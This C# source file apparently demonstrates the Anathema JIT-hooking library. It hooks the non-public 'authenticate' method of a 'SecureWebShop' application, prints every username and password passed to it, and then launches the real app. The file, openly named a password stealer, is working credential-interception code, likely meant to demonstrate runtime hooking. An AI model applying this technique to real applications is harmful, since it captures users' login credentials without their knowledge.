using ES.Anathema.Hook;
using ES.Anathema.Runtime;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace SecureWebShopPasswordStealer
{
    class PasswordStealerMonitor
    {
        public PasswordStealerMonitor(MethodBase m, object[] args)
        {
            Console.WriteLine(
                "[!] Username: '{0}', Password: '{1}'", args[0], args[1]);
        }
    }

    class Program
    {
        public static MethodInfo GetAuthenticateMethod()
        {
            foreach (var assembly in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (assembly.FullName.Contains("SecureWebShop"))
                {
                    foreach(var assemblyType in assembly.GetTypes())
                    {
                        if (assemblyType.FullName.Contains("authenticate"))
                        {
                            return assemblyType.DeclaringType.GetMethod("authenticate", BindingFlags.Static | BindingFlags.NonPublic);
                        }
                    }
                }
            }
            return null;
        }
            
        static unsafe void Main(string[] args)
        {
            // create runtime
            var runtime = new RuntimeDispatcher();
            var hook = new Hook(runtime.CompileMethod);
            var authenticateMethod = GetAuthenticateMethod();
            runtime.AddFilter(typeof(PasswordStealerMonitor), "SecureWebShop.Program." + authenticateMethod.Name);

            // apply hook
            var jitHook = new JitHook();
            jitHook.InstallHook(hook);
            jitHook.Start();

            // start the real web application
            SecureWebShop.Program.main(new String[] { });
        }
    }
}
